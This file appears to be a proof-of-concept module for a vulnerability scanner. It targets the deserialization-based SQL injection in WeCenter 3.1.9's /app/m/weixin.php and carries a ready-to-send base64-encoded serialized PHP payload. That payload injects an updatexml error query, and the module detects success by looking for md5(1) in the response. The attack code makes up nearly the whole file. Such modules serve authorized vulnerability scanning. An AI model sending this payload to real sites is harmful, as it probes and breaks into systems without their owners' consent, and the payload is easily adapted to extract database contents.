# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WeCenter_0002'  # 平台漏洞编号，留空
    name = 'WeCenter 3.1.9 /app/m/weixin.php 反序列化造成SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2017-01-08'  # 漏洞公布时间
    desc = '''
        Wecenter(微中心系统软件)是一款由深圳市微客互动有限公司开发的具有完全自主知识产权的开源软件。
        wecenter 3.1.9 /app/m/weixin.php 文件中，对传入的参数反序列化后直接构造SQL语句进行查询，导致SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'http://0day5.com/archives/4341/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WeCenter'  # 漏洞应用名称
    product_version = '3.1.9'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a818aa31-eb18-4b7d-9aeb-f5e87806d3f2'
    author = '47bwy'  # POC编写者
    create_date = '2018-06-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            payload = "/?/m/weixin/authorization/=OAUTH=YToyOntzOjc6ImVycmNvZGUiO2k6MTtpOjA7Tzo5OiJBV1NfTU9ERUwiOjE6e3M6MjY6IgBBV1NfTU9ERUwAX3NodXRkb3duX3F1ZXJ5IjthOjE6e2k6MDtzOjQwOiJTRUxFQ1QgdXBkYXRleG1sKDEsY29uY2F0KDB4YSxtZDUoMSkpLDEpIjt9fX0%3D"
            url = self.target + payload
            r = requests.get(url)

            if "c4ca4238a0b923820dcc509a6f75849b" in r.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
